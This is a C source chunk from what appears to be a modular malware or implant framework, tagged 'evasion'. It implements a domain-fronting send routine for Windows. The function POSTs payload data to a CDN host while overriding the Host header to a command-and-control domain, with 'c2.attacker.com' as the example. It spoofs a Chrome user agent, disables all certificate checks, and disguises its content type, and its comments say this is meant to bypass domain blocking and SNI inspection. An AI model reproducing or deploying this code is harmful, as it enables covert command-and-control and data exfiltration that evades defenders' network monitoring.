// chunk: evasion/net_domain_front
// depends: (none)
// provides: domain_front_send
// headers: windows.h,winhttp.h
// libs: winhttp
// risk: medium
// note: Domain fronting — connects to a CDN host but sets the HTTP Host header
//       to the actual C2 domain. SNI and DNS show the CDN domain; the CDN routes
//       traffic to the real C2 based on the Host header. Bypasses domain-based
//       blocking and SSL inspection that relies on SNI.

#ifndef CHUNK_NET_DOMAIN_FRONT
#define CHUNK_NET_DOMAIN_FRONT

#include <windows.h>
#include <winhttp.h>

#pragma comment(lib, "winhttp")

/* Send data via domain fronting.
 * cdn_host  — the CDN/front domain that appears in DNS and SNI (e.g. "cdn.example.com")
 * real_host — the actual C2 domain set in the Host header (e.g. "c2.attacker.com")
 * port      — destination port (typically 443)
 * path      — URI path (e.g. "/api/collect")
 * data/len  — payload to POST
 * Returns 0 on success, -1 on error.
 */
static int domain_front_send(const char *cdn_host, const char *real_host,
                              int port, const char *path,
                              const BYTE *data, DWORD len) {
    int ret = -1;
    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;

    /* Convert narrow strings to wide for WinHTTP */
    WCHAR wCdn[256]  = {0};
    WCHAR wHost[256] = {0};
    WCHAR wPath[512] = {0};
    MultiByteToWideChar(CP_UTF8, 0, cdn_host,  -1, wCdn,  256);
    MultiByteToWideChar(CP_UTF8, 0, real_host, -1, wHost, 256);
    MultiByteToWideChar(CP_UTF8, 0, path,      -1, wPath, 512);

    /* User-agent mimics Chrome */
    hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                           L"AppleWebKit/537.36 (KHTML, like Gecko) "
                           L"Chrome/120.0.0.0 Safari/537.36",
                           WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                           WINHTTP_NO_PROXY_NAME,
                           WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) goto cleanup;

    /* Connect to the CDN domain — this is what appears in DNS/SNI */
    hConnect = WinHttpConnect(hSession, wCdn, (INTERNET_PORT)port, 0);
    if (!hConnect) goto cleanup;

    hRequest = WinHttpOpenRequest(hConnect, L"POST", wPath,
                                  NULL, WINHTTP_NO_REFERER,
                                  WINHTTP_DEFAULT_ACCEPT_TYPES,
                                  WINHTTP_FLAG_SECURE);
    if (!hRequest) goto cleanup;

    /* Ignore certificate errors (self-signed CDN or test environments) */
    DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                  SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE |
                  SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                  SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
    WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS,
                     &flags, sizeof(flags));

    /* Override the Host header to the real C2 domain.
     * CDN sees this header and routes to the C2 origin server.
     * Network inspection sees only the CDN domain in SNI. */
    WCHAR hostHeader[300] = {0};
    wsprintfW(hostHeader, L"Host: %s", wHost);
    WinHttpAddRequestHeaders(hRequest, hostHeader, (DWORD)-1,
                             WINHTTP_ADDREQ_FLAG_ADD |
                             WINHTTP_ADDREQ_FLAG_REPLACE);

    /* Content-Type to blend with normal API traffic */
    WinHttpAddRequestHeaders(hRequest,
        L"Content-Type: application/octet-stream", (DWORD)-1,
        WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);

    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                            (LPVOID)data, len, len, 0))
        goto cleanup;

    if (!WinHttpReceiveResponse(hRequest, NULL))
        goto cleanup;

    /* Check for 2xx status */
    DWORD status = 0, sz = sizeof(status);
    WinHttpQueryHeaders(hRequest,
                        WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                        WINHTTP_HEADER_NAME_BY_INDEX, &status, &sz, NULL);
    if (status >= 200 && status < 300)
        ret = 0;

cleanup:
    if (hRequest)  WinHttpCloseHandle(hRequest);
    if (hConnect)  WinHttpCloseHandle(hConnect);
    if (hSession)  WinHttpCloseHandle(hSession);
    return ret;
}

#endif
